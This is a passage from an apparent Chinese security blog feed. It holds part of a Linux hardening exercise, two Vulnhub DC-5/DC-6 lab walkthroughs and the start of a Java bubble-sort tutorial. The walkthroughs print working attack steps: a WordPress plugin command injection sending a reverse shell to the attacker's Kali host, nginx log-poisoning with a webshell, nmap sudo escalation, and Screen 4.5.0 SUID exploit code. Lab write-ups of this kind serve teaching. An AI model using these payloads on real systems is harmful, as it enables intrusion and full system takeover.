密码最小过期天数</span>PASS_MIN_LEN    <span class="token number">10</span>  　　　　<span class="token comment"># 密码最小长度</span>PASS_WARN_AGE   <span class="token number">7</span>   　　　 <span class="token comment"># 密码过期警告天数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第二种方法才是题目需要的方法，位置在<code>/etc/pam.d/system-auth</code>，修改位置如下图。</p><p><img src="/images/wordimage/2022/1018/passx.png"></p><hr><h3 id="3-禁止匿名用户登录vsftpd"><a href="#3-禁止匿名用户登录vsftpd" class="headerlink" title="3.禁止匿名用户登录vsftpd"></a>3.禁止匿名用户登录vsftpd</h3><blockquote><p>3.禁止匿名用户登录vsftpd服务，将配置文件中对应的部分截图；</p></blockquote><p><code>vsftpd</code>服务配置在路径<code>/etc/vsftpd/vsftpd.conf</code>，具体修改位置如下图。</p><p><img src="/images/wordimage/2022/1018/vsftpd.png"></p><hr><h3 id="4-设置关闭ftp-data端口"><a href="#4-设置关闭ftp-data端口" class="headerlink" title="4.设置关闭ftp-data端口"></a>4.设置关闭ftp-data端口</h3><blockquote><p>4.设置关闭ftp-data端口不使用主动模式，使用ipv4进行监听，将配置文件中对应的部分截图；</p></blockquote><p>需要修改的文件路径是<code>/etc/vsftpd/vsftpd.conf</code>，具体看下图。</p><p><img src="/images/wordimage/2022/1018/buzhudong.png" alt="不使用主动模式"></p><p><img src="/images/wordimage/2022/1018/IPV4jianting.png" alt="使用ipv4进行监听"></p><hr><h3 id="5-修改Telnet端口"><a href="#5-修改Telnet端口" class="headerlink" title="5.修改Telnet端口"></a>5.修改Telnet端口</h3><blockquote><ol start="5"><li>将Telnet服务的端口号修改为2323 ,查看Telnet服务端口信息，将回显结果截图；</li></ol></blockquote><p>环境有问题，怎么也不行，就在网上找了文章<a href="https://blog.csdn.net/v6543210/article/details/102570472">修改Telnet端口</a></p><hr><h3 id="6-限制Telnet用户连接"><a href="#6-限制Telnet用户连接" class="headerlink" title="6.限制Telnet用户连接"></a>6.限制Telnet用户连接</h3><blockquote><p>6.限制Telnet用户连接，单个IP允许的最大连接数为1，总的最大连接数为10，将配置文件中对应的部分截图；</p></blockquote><p>环境问题，参考文章<a href="http://www.361way.com/telnet-max-conn-num/3947.html">限制Telnet用户连接</a>还有这个<a href="https://www.cnblogs.com/lsdb/p/7885172.html">限制Telnet用户连接</a>。</p><hr><h3 id="7-允许root用户通过SSH"><a href="#7-允许root用户通过SSH" class="headerlink" title="7.允许root用户通过SSH"></a>7.允许root用户通过SSH</h3><blockquote><p>7.允许root用户通过SSH远程登录，将配置文件中对应的部分截图；</p></blockquote><p>修改路径在<code>/etc/ssh/sshd_config</code>具体如下图</p><p><img src="/images/wordimage/2022/1018/PermitRootlogin.png"></p><hr><h3 id="8-SSH设置RSA证书登录"><a href="#8-SSH设置RSA证书登录" class="headerlink" title="8.SSH设置RSA证书登录"></a>8.SSH设置RSA证书登录</h3><blockquote><p>8.配置SSH服务，设置RSA证书登录，将配置文件中对应的部分截图；</p></blockquote><p>参考文章<a href="https://blog.csdn.net/programmeryu/article/details/91606133">Centos7 ssh配置RSA证书登录</a>。</p><hr><h3 id="9-修改httpd服务为root权限"><a href="#9-修改httpd服务为root权限" class="headerlink" title="9.修改httpd服务为root权限"></a>9.修改httpd服务为root权限</h3><blockquote><p>9.修改网站的httpd服务为root权限，将配置文件中对应的部分截图；</p></blockquote><p>修改路径在<code>/etc/httpd/conf/httpd.conf</code>，具体修改如下图。</p><p><img src="/images/wordimage/2022/1018/httproot.png"></p><hr><h3 id="10-设置HTTP服务"><a href="#10-设置HTTP服务" class="headerlink" title="10.设置HTTP服务"></a>10.设置HTTP服务</h3><blockquote><p>10.设置HTTP服务，修改网站的配置文件，配置滚动日志按天记录网站的访问日志和错误日志，将配置文件中对应的部分截图。</p></blockquote><p>无。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全金砖五国国赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统加固 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-6靶机实战(Nmap提权)</title>
      <link href="/2022/058a5ff09b.html"/>
      <url>/2022/058a5ff09b.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></p><blockquote><p>KALI地址：192.168.16.108</p><p>靶机地址：192.168.16.3</p></blockquote><p>如下图，是靶机介绍，可能有暴力破解的地方</p><p><img src="/images/wordimage/2022/0519/bajijieshao.png"></p><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用下面的命令来发现靶机</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.16.108<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现了靶机地址</p><p><img src="/images/wordimage/2022/0519/net.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>既然发现了主机的IP地址那么就可以进行主机扫描，这里使用的是nmap命令，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.16.3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现就开放了<code>80</code>端口和<code>22</code>端口</p><p><img src="/images/wordimage/2022/0519/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然开放了<code>80</code>端口那么肯定要来进行一次目录扫描，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.16.3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现就是<code>wordpress</code>的网站。</p><p><img src="/images/wordimage/2022/0519/dirb.png"></p><hr><h3 id="4-网页信息收集"><a href="#4-网页信息收集" class="headerlink" title="4.网页信息收集"></a>4.网页信息收集</h3><p>既然是wordpress网站，直接访问IP地址访问即可，但是发现自动跳转到了一个域名，如下图。</p><p><img src="/images/wordimage/2022/0519/wordy.png"></p><p>所以这里我们要更改<code>host</code>文件，让IP地址指向这个域名，如果是windows，打开这个路径修改即可👉<code>C:\WINDOWS\system32\drivers\etc</code>如果你是linux可以去<code>/etc/hosts</code>增加即可，如下两张图，分别是windows的添加和linux的添加。</p><p><img src="/images/wordimage/2022/0519/windowshost.png" alt="Windows"></p><p><img src="/images/wordimage/2022/0519/linuxhost.png" alt="Linux"></p><p>这样我们再访问IP地址就可以正常访问了，看见这个是wordpress的网站肯定需要<code>wpscan</code>来扫描一下这个wordpress的用户有哪些，如下命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://wordy -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，扫描出来了<code>admin</code>,<code>sarah</code>,<code>mark</code>,<code>jens</code>这些用户</p><p><img src="/images/wordimage/2022/0519/wordpressuser.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1.暴力破解"></a>1.暴力破解</h3><p> 其实上面搜索了一下，发现并没有了什么可以利用的点了，但是因为靶机的提示说需要用到暴力破解，所以这里我们把上面的用户放在<code>user.txt</code>里面然后把KALI自带的字典也就是<code> /usr/share/wordlists/rockyou.txt</code>复制到桌面更改为<code>passwords.txt</code>，这里我们还是使用<code>wpscan</code>来暴力破解wordpress，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://wordy -U user.txt -P passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，破解出来一个用户和密码，所以我们得到一个用户密码</p><blockquote><p>用户：mark</p><p>密码：helpdesk01</p></blockquote><p><img src="/images/wordimage/2022/0519/wpscansucc.png"></p><p>然后我们登录wordpress后台即可。</p><hr><h3 id="2-CVE-2018-15877"><a href="#2-CVE-2018-15877" class="headerlink" title="2.CVE-2018-15877"></a>2.CVE-2018-15877</h3><p>其实到了后台之后，我的第一反应是找模板位置，写入一句话木马，但是我怎么找，都没有找到，然后就找到这个<code>wordpress</code>站点安装了<code>Activity monitor</code>插件，然后百度了一下就找到了这个插件有远程执行漏洞，编号是<code>CVE-2018-15877</code>，按照如下图操作。</p><p><img src="/images/wordimage/2022/0519/Activity.png"></p><p>然后再里面框框测试一下，发现确实是有远程命令执行的漏洞的，再中间写完命令之后点击<code>Lookup</code>如下图。</p><p><img src="/images/wordimage/2022/0519/IP.png"></p><p>看下图，执行成功，确实有远程命令执行漏洞。</p><p><img src="/images/wordimage/2022/0519/IP2.png"></p><p>既然可以执行命令执行，那么就可以尝试反弹一下SHELL试试，首先再KALI里面开启监听，命令是<code>nc -lnvp 4444</code>，如下图。</p><p><img src="/images/wordimage/2022/0519/nclnvp.png"></p><p>然后在上面输入<code>127.0.0.1|nc -e /bin/bash 192.168.16.108 4444</code>，但是发现长度不够长，看看用元素选择器能不能修改，长度，如下图，发现可以修改长度，这里我就修改个<code>500</code>吧。</p><p><img src="/images/wordimage/2022/0519/maxlenth.png"></p><p>然后再重新输入命令进去，发现就可以了，然后点击<code>Lookup</code>即可反弹shell，如下图，反弹成功。</p><p><img src="/images/wordimage/2022/0519/ncsucc.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>这里查看是否有python，命令是<code>whereis python</code>如下图，发现是有python的。</p><p><img src="/images/wordimage/2022/0519/pythonok.png"></p><p>然后我们使用命令<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code>来更换终端，如下图。</p><p><img src="/images/wordimage/2022/0519/pyshell.png"></p><p>然后我们就可以进行一系列操作，比如看<code>/etc/passwd</code>或者是<code>/home</code>下的敏感信息，然后在<code>/home/mark</code>发现了敏感信息，如下图，似乎是<code>grahm</code>的密码。</p><p><img src="/images/wordimage/2022/0519/newuser.png"></p><p>我们切换到这个用户</p><p><img src="/images/wordimage/2022/0519/su.png"></p><p>由于这个终端看着不舒服，所以我下面使用<code>ssh</code>连接靶机，我们切换到<code>grahm</code>用户之后，还是和上面的操作类似就找呗，然后就发现，可以使用切换到<code>jens</code>用户的命令，如下图。</p><p><img src="/images/wordimage/2022/0519/jens.png"></p><p>然后我们可以去到这个目录，发现确实有这个文件，然后我们使用命令<code>sudo -u jens ./backups.sh</code>以jens用户来执行这个文件，发现确实可以执行，但是执行的代码确是如下内容。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span class="token function">tar</span> -czf backups.tar.gz /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就是备份<code>html</code>目录，接下来就没有图了，因为靶机坏了，我也懒得重新改了，但是之前做的记录还在，就用记录来说明吧，反正后面也简单。</p><p>之后我们就需要更改<code>backups.sh</code>里面的内容，让我们执行这个文件之后可以切换到<code>jens</code>的用户，所以我们，执行如下两条命令，就可以切换到<code>jens</code>用户，首先&gt;是直接覆盖如果是&gt;&gt;就是追加，如果想要追加可以写成<code>echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">></span> backups.sh<span class="token function">sudo</span> -u jens ./backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后到这里就切换到了<code>jens</code>用户，之后我们输入<code>sudo -l</code>可以，发现<code>jens</code>用户可以使用<code>nmap</code>来提权，原文是这样的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/nmap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果看见上面这个就可以使用nmap来提权，然后百度查了一下，nmap提权，nmap提权需要老版本，输入<code>nmap</code>命令可以查看到当前靶机的nmap版本是<code>7.4</code>版本，如下是提权命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/sh")'</span> <span class="token operator">></span> shell<span class="token function">sudo</span>  nmap  --script<span class="token operator">=</span>shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样就提权到了root。</p><hr><h3 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h3><p>最主要是提权的位置是<code>nmap</code>提权方法必须要老版本。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-5靶机实战</title>
      <link href="/2022/052ec5cf0b.html"/>
      <url>/2022/052ec5cf0b.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a></p><blockquote><p>KALI地址：192.168.16.109</p><p>靶机地址：192.168.16.1</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用如下命令来发现靶机</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.16.109<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图发现了靶机地址</p><p><img src="/images/wordimage/2022/0518/net.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>这里使用nmap工具，命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.16.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果如下，发现开放的端口少的可怜</p><p><img src="/images/wordimage/2022/0518/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>虽然少的可怜但是开放了80端口，肯定要用dirb来扫一下目录啊，命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.16.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现目录扫描出来的东西也少的可怜</p><p><img src="/images/wordimage/2022/0518/dirb.png"></p><hr><h3 id="4-网页信息收集"><a href="#4-网页信息收集" class="headerlink" title="4.网页信息收集"></a>4.网页信息收集</h3><p>打开发现是有五个页面可以点击的，前面四个没有什么好看的，目录扫描也没有扫描出来什么东西，但是最后一个目录有可以写入的东西也就是<code>contact.php</code>这个目录，但是写入东西然后发送之后，发现是GET传参，如下图。</p><p><img src="/images/wordimage/2022/0518/get.png"></p><p>但是经过了一系列的斗争搜索，真没发现什么可以利用的，然后这里我们使用kali的whatweb命令查看是什么结构的网站，如下图。</p><p><img src="/images/wordimage/2022/0518/whatweb.png"></p><p>但是这样扫描也没有发现什么东西， 只能发现这个东西是<code>nginx</code>的网站，所以我不服，用<code>dirsearch</code>这个工具来重新扫描一下目录，这个工具可以自行百度下载，果然是kali的没有扫出来，如下图。</p><p><img src="/images/wordimage/2022/0518/footer.png"></p><p>看样子是，一个脚页的名字，感觉没啥用，如下图访问。</p><p><img src="/images/wordimage/2022/0518/footerd.png"></p><p>不对，在自己边做边写文章的时候注意到，上面访问<code>contact.php</code>的时候，下面的年份是2020年，怎么访问这个是2018年，于是回到上面<code>contact.php</code>写入的地方刷新也就是<code>thankyou.php</code>的地方，证明了我的猜想，那么极有可能是这个地方包含了<code>footer.php</code>这个文件才能实现刷新，如下图，发送文件<code>thankyou.php</code>的地方，年份从2020变成了2018。</p><p><img src="/images/wordimage/2022/0518/2018.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1.文件包含"></a>1.文件包含</h3><p>既然是猜测是文件包含漏洞，那么这里猜一猜变量是否为常见的<code>file</code>，如下图，还真是<code>file</code>，如果不行就只能爆破试试了。</p><p><img src="/images/wordimage/2022/0518/fileinclude.png"></p><p>既然有文件包含，其实我想的是用<code>/var/log/auth.log</code>来写入一句话木马，但是没有开放22端口，只能另寻办法，上面信息收集，发现是<code>nginx</code>的网站，那么看看能不能包含<code>nginx</code>的日志文件，在网上寻找了一番发现，我们需要利用的是一个叫做访问日志的东西，也就是<code>access.log</code>，如下图。</p><p><img src="/images/wordimage/2022/0518/nginx.png"></p><p>根据资料查找，发现路径是<code>/var/log/nginx/access.log</code></p><p>如下图，发现可以访问，而且可以发现下面的内容都是我们访问过的URL地址的内容。</p><p><img src="/images/wordimage/2022/0518/accesslog.png"></p><p>BP抓包，在里面修改包内容，在正常的URL地址后面根上一句话木马，如下图。</p><p><img src="/images/wordimage/2022/0518/minecraft.png"></p><p>然后我们在查看日志内容是否有刚才我们访问的东西，如下图，发现是有的。</p><p><img src="/images/wordimage/2022/0518/minecraftfl.png"></p><p>如下图，然后我们在用蚁剑连接，发现可以连接成功的！</p><p><img src="/images/wordimage/2022/0518/mayi.png"></p><p>由于蚁剑的终端可能会经常出毛病，所以这里直接nc反弹到kali里去了，如下图。</p><p><img src="/images/wordimage/2022/0518/nc.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>既然反弹成功，这里查看是否有python，命令是<code>whereis python</code>，如下图，发现是有python的</p><p><img src="/images/wordimage/2022/0518/python.png"></p><p>然后这里使用python来更换shell，命令是<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code>。</p><p>然后我们在来三问，如下图。</p><p><img src="/images/wordimage/2022/0518/sanwen.png"></p><p>然后查看具有SUID权限的命令，命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -perm /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>/： 对应的是根目录</p><p>-perm /4000：   查找SUID权限</p><p>2&gt; ：输出错误到空文件</p></blockquote><p>如下图，发现了可以SUID的命令</p><p><img src="/images/wordimage/2022/0518/screen.png"></p><p>然后我们KALI找一下是否有漏洞，使用命令<code>searchsploit screen 4.5.0</code> ，如下图，然后把文件复制到桌面查看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/41154.sh ./<span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/41152.txt ./<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>复制了我直接开始编译，发现是失败的，我就郁闷了为啥失败，然后打开看了一下文件，才明白了咋回事，首先看下面这个图，把红色框框的代码复制出来。放在<code>libhax.c</code>的文件里， 然后再使用<code>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</code>编译即可，这里我放在当前目录下面就没有加<code>/tmp</code>目录</p><p><img src="/images/wordimage/2022/0518/libhax.png"></p><p>上面代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">void</span> <span class="token function">dropshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">chown</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">04755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/etc/ld.so.preload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译成功之后，再和上面操作一样把下面部分编译即可，如下图，我这里的编译命令是<code>gcc -o rootshell rootshell.c</code></p><p><img src="/images/wordimage/2022/0518/rootshell.png"></p><p>代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做完这些操作之后发现就生成了两个文件分别是<code>rootshell</code>和<code>libhax.so</code>，最后就可以把生成的文件放在靶机的<code>/tmp</code>目录下面了，这里可以使用kali自带的web服务<code>service start apache2</code>来开启WEB服务，然后把文件放在KALI的<code>/var/www/html</code>目录下面，最后再回到靶机用<code>wget</code>命令下载即可，如下图靶机下载成功。</p><p><img src="/images/wordimage/2022/0518/wgetshell.png"></p><p>最后我们再执行脚本里面提示的命令即可，前提是文件要放在靶机的<code>/tmp</code>目录下面,如下命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc<span class="token builtin class-name">umask</span> 000 <span class="token function">screen</span> -D -m -L ld.so.preload <span class="token builtin class-name">echo</span> -ne  <span class="token string">"<span class="token entity" title="\x0a">\x0a</span>/tmp/libhax.so"</span> <span class="token function">screen</span> -ls /tmp/rootshell        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图提权成功，先来三问，发现成功提权到了root权限！！</p><p><img src="/images/wordimage/2022/0518/rootsucc.png"></p><p>然后我们就可以去<code>root</code>目录查看flag，如下图，完结！</p><p><img src="/images/wordimage/2022/0518/flag.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>记得SUID提权的方式，和查找命令是<code>find / -perm /4000 2&gt;/dev/null</code></p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java实现冒泡排序-通俗易懂</title>
      <link href="/2022/056eb004fe.html"/>
      <url>/2022/056eb004fe.html</url>
      
        <content type="html"><![CDATA[<p>先说思路假设有一个数组是<code>arr = [24, 69, 80, 57, 13]</code>，分别对应的下标是<code>[0, 1, 2, 3, 4]</code>现在需要把最大的数字放在最后面，就排序成<code>[13, 24, 57, 69, 80]</code>，看样子非常简单。</p><br><p>那么进行第一次排序，24和69排序，下标0对应的是24，和下标1对应的69进行比较。</p><p>小的放在左边，大的放在右边，那么这里就不变，这里直接举例子80和57的位置。</p><p>80对应的下标是2，57对应的下标是3，现在80比57大所以需要把57变换到80的位置也就是下标变化。</p><p>所以需要做的就是把2的下标80变成57，3的下标57变成80就进行了一次交换。</p><p>然后就变成了80和13的交换，80比13大，首先80现在的下标是3，13的下标是4。</p><p>那么就需要把4的下标13变成80，3的下标80变成13就可以进行了交换，如下交换流程。</p><p>从左到右比较</p><br><p>第一轮比较：目标大的放在最后面</p><p>第一次比较<code>[24, 69, 80, 57, 13]</code></p><p>第二次比较<code>[24, 69, 80, 57, 13]</code></p><p>第三次比较<code>[24,69,57,80,13]</code></p><p>第四次比较<code>[24, 69, 57, 13, 80]</code></p><br><p>第二轮比较：目标把第二大的数放在倒数第二的位置</p><p>第一次比较<code>[24, 69, 57, 13, 80]</code></p><p>第二次比较<code>[24, 57, 69, 13, 80]</code></p><p>第三次比较<code>[24, 57, 13, 69, 80]</code></p><br><p>第三轮比较：目标把第三大的数放在倒数第三的位置</p><p>第一次比较<code>[24, 57, 13, 69, 80]</code></p><p>第二次比较<code>[24, 13, 57, 69, 80]</code></p><br><p>第四轮比较：目标把第四大的数放在倒数第四的位置</p><p>第一次比较<code>[13, 24, 57, 69, 80]</code></p><br><p>到这里可以发现进行了四轮比较，每一轮比较里面还有比较数字的操作，这里可以简单进行代码，如下图就实现了第一轮循环，输出是</p><p><code>24    69    57    13    80    </code>，如果我们需要进行第二轮比较只需要把循环的 j &lt; 4变成 j &lt; 3即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">chapter6<span class="token punctuation">.</span></span>冒泡排序<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> maopao <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> arr<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">//定义temp变量</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//假设这里是第一次循环j为0那么就判断的是arr[0] > arr[1]</span>            <span class="token comment">//也就是判断24 > 69</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//进行转换操作，稍微看看还是能看懂的因为进行两个数字转换</span>                <span class="token comment">//需要用到变量</span>                temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//输出每次交换过后的数字</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\t"</span><span 